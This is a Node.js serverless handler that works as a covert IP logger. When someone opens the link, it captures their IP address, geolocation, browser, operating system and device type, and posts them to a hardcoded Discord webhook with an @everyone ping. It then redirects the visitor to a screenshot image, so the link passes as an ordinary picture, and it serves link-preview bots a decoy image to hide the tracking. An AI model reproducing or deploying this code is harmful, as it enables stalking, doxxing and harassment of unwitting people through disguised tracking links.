// PUBLIC TIER - /public
module.exports = async function handler(req, res) {
  if (req.method !== "GET" && req.method !== "HEAD") {
    return res.status(405).send("Method Not Allowed");
  }

  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1531056764127154216/0E10iH35M9cZm2bY1CJ4R1KUnvGkwndndg3NWGv-AAFtdkTLCtxqFS60EHA02Ngrz1NK";
  const TARGET_IMAGE = "https://cdn.discordapp.com/attachments/1531049131412426934/1531081254454300873/Screenshot_2026-07-26-21-42-42-429_com.zhiliaoapp.musically-edit.jpg?ex=6a67ea09&is=6a669889&hm=5a9fc2d52b1684b1fc2eaa9736201048d01308f9b7ed111d778e69551ea684b0";
  const BOT_IMAGE = "https://i.pinimg.com/736x/25/83/25/258325e218093f78599368d65312663d.jpg";

  const ip = req.headers["cf-connecting-ip"] || req.headers["x-vercel-forwarded-for"]?.split(",")[0] || req.headers["x-forwarded-for"]?.split(",")[0] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "Unknown";
  const ua = req.headers["user-agent"] || "Unknown";
  const endpoint = req.url || "/public";

  const ignoreAgents = ["vercel", "vercel-favicon", "node", "axios", "curl", "wget", "uptime", "statuscake"];
  if (new RegExp(ignoreAgents.join("|"), "i").test(ua)) {
    return res.redirect(302, TARGET_IMAGE);
  }

  if (/(bot|crawler|spider|discordbot|telegrambot|slackbot|facebookexternalhit|twitterbot|linkedinbot|pinterest|whatsapp|skypeuripreview|googlebot|bingbot|yandex)/i.test(ua) || req.method === "HEAD") {
    return res.redirect(302, BOT_IMAGE);
  }

  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes("firefox")) return "Firefox";
    if (u.includes("edg")) return "Edge";
    if (u.includes("brave")) return "Brave";
    if (u.includes("chrome") && !u.includes("edg")) return "Chrome";
    if (u.includes("safari") && !u.includes("chrome")) return "Safari";
    return "Unknown";
  })();

  const device = /mobile|android|iphone/i.test(ua) ? "Mobile 📱" : /ipad|tablet/i.test(ua) ? "Tablet 📟" : "Desktop 🖥️";
  const system = /windows/i.test(ua) ? "Windows" : /android/i.test(ua) ? "Android" : /iphone|ios/i.test(ua) ? "iOS" : /mac/i.test(ua) ? "MacOS" : /linux/i.test(ua) ? "Linux" : "Unknown";

  let geo = {};
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,query`);
    if (geoRes.ok) geo = await geoRes.json();
  } catch {}

  const embed = {
    title: `📡 CAPTURA PÚBLICA`,
    color: 0x2ecc71,
    fields: [
      { name: "📍 Ubicación", value: `${geo.city || "Desconocida"}, ${geo.country || "Desconocido"}`, inline: false },
      { name: "🌐 Dirección IP", value: `\`${ip}\``, inline: false },
      { name: "💻 Sistema", value: system, inline: false },
      { name: "🌍 Navegador", value: browser, inline: false },
      { name: "🖥️ Tipo", value: device, inline: false },
      { name: "📜 User Agent", value: "```" + ua.substring(0, 150) + "```", inline: false }
    ],
    footer: {
      text: `${new Date().toLocaleString()}`
    },
    timestamp: new Date().toISOString()
  };

  const payload = {
    content: `@everyone`,
    allowed_mentions: { parse: ["everyone"] },
    embeds: [embed]
  };

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(() => {});

  return res.redirect(302, TARGET_IMAGE);
};
